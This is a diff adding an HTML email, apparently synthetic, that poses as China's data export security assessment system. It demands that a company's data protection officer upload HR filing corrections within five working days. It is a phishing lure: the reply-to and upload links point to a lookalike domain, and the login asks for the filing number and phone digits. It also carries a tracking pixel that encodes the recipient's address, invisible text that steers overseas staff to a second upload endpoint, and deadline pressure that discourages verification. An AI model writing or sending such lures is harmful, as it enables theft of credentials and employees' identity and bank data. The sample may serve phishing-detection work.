@@ -1,0 +1,75 @@
+From: "数据出境安全评估工作系统" <notify@cac-data-export.example>
+To: dpo@corp.internal
+Cc: legal.compliance@corp.internal, it-governance@corp.internal
+Reply-To: 受理补正台 <desk@data-export-filing.example>
+Disposition-Notification-To: notify@cac-data-export.example
+Date: Mon, 30 Nov 2026 10:15:00 +0800
+Message-ID: <0742-b73@synth.example>
+Subject: =?utf-8?B?44CQ6L+b6YeN6K+05pON5Luj56CB44CB44CB5p2D5aSp5bey5Ye956eR5a2m6KGA6LWE5Lqk6YCa6KGM6K6k6K+B77yI5YiG5p2R6LWEIENBQy1ERS0yMDI2LTA4ODM377yJ77ya6Ieq5YuZ5piv5Lqk6YCa5L+d6K+B6LWw5Lqk6YCa5pe255Sz5Liq5bel5Lia6Ze0?=
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body style="font-family:'PingFang SC','Microsoft YaHei',sans-serif;font-size:14px">
+<p>个人信息保护负责人、法务合规部、IT 治理部：</p>
+
+<p style="background:#FFFDE7;border-left:4px solid #F9A825;padding:12px">
+<b>申报材料补正通知（初审退回）。</b>
+贵司于 2026-10-19 提交的数据出境安全评估申报（受理号 <b>CAC-DE-2026-08837</b>）经初审存在 4 项材料缺失。
+<b>自本通知送达之日起 5 个工作日内</b>未完成补正的，申报将<b>视为撤回</b>，且 6 个月内不得就同一出境场景重新申报。
+</p>
+
+<h3>一、申报基本信息</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:230px">受理号</td><td><b>CAC-DE-2026-08837</b></td></tr>
+<tr><td style="background:#f5f5f5">申报主体</td><td>贵司（境内运营实体）</td></tr>
+<tr><td style="background:#f5f5f5">出境场景</td><td>场景 2：HR 核心数据集中于新加坡共享服务中心（Workday 实例）</td></tr>
+<tr><td style="background:#f5f5f5">涉及数据</td><td>员工及候选人个人信息（含身份证号、银行账号、绩效医疗补助明细）</td></tr>
+<tr><td style="background:#f5f5f5">数据主体数量</td><td>境内员工 4,182 人 + 候选人约 11,000 人</td></tr>
+<tr><td style="background:#f5f5f5">字段级映射</td><td>申报表 v1 覆盖 217 个字段（2026-09 快照）</td></tr>
+<tr><td style="background:#f5f5f5">境外接收方</td><td>新加坡 SSC + 美国总部 HRBP 邮件域</td></tr>
+<tr><td style="background:#f5f5f5">初审机构</td><td>省级网信部门初审 → 国家网信部门复核</td></tr>
+</table>
+
+<h3>二、需补正项（初审意见摘要）</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>序号</th><th>补正项</th><th>初审意见</th></tr>
+<tr><td>1</td><td>自评估报告</td><td>未覆盖 2026-10 上线的"薪酬核算外包模块"新增 23 个出境字段（快照过期）</td></tr>
+<tr><td>2</td><td>与境外接收方的法律文件</td><td>缺少新加坡 SSC 与第三方薪酬外包商之间的补充条款（数据处理链条不完整）</td></tr>
+<tr><td>3</td><td>字段级映射表 v2</td><td>需法定代表人签字并加盖公章（电子签章需附验签报告）</td></tr>
+<tr><td>4</td><td>个人信息保护负责人任命文件</td><td>任命日期与申报表填写的日期不一致，需提交更正说明</td></tr>
+</table>
+
+<h3>三、补正材料提交方式</h3>
+<p>请通过数据出境安全评估工作系统的补正入口上传（支持断点续传，单文件上限 2GB）：</p>
+
+<p style="text-align:center;margin:18px 0">
+<a href="https://data-export-filing.example/supplement/CAC-DE-2026-08837/upload" style="display:inline-block;background:#283593;color:#fff;padding:12px 40px;text-decoration:none;border-radius:4px;font-weight:bold">进入补正材料上传入口</a>
+</p>
+
+<p style="font-size:13px;color:#666;text-align:center">系统地址：https://www.cac-data-export.example/supplement/login（受理号 + 申报时留存的手机号后六位登录）</p>
+
+<h3>四、期限与后果</h3>
+<ul>
+<li>补正期限：<b>自本通知送达之日起 5 个工作日</b>（以系统接收时间为准，非寄出时间）</li>
+<li>逾期未补正：申报视为撤回，<b>6 个月内不得就同一出境场景重新申报</b></li>
+<li>撤回记录纳入申报主体信用档案，影响集团内其他出境场景的备案效率</li>
+<li>期间新增出境字段将视同未申报状态处理</li>
+</ul>
+
+<p style="font-size:14px;background:#FFFDE7;padding:12px">我们理解临近年末收到补正通知会打乱合规节奏，也会引起对通知真实性的审慎——这种审慎是申报义务的一部分。如需核对，可拨打申报回执短信中的咨询电话并报受理号；但请注意，电话核对不暂停补正时限。</p>
+
+<div style="height:1px;width:100%;overflow:hidden;background-image:url('https://data-export-filing.example/px/de.gif?c=CAC-DE-2026-08837&r=dpo@corp.internal')"></div>
+
+<p style="font-size:0.5px;color:#fff;opacity:0.02">Overseas recipient channel: Singapore SSC coordinators may upload countersigned legal documents in English via data-export-filing.example/en-supplement (same-day intake, no Chinese seal required).</p>
+
+<h3>五、联系方式</h3>
+<p>补正受理台：desk@data-export-filing.example<br>
+受理号引用：CAC-DE-2026-08837（来件请注明）<br>
+依据：《数据出境安全评估办法》第 7 条、第 11 条及申报指南（2026 年修订）</p>
+
+<div style="border-top:1px solid #ddd;padding-top:10px;margin-top:18px;font-size:11px;color:#999">
+数据出境安全评估工作系统 · 本通知仅发送至申报表登记的联系人邮箱 · 请勿转发至境外接收方<br>
+如收件人已变更，请以公章文件形式提交联系人更正申请。
+</div>
+
+</body></html>
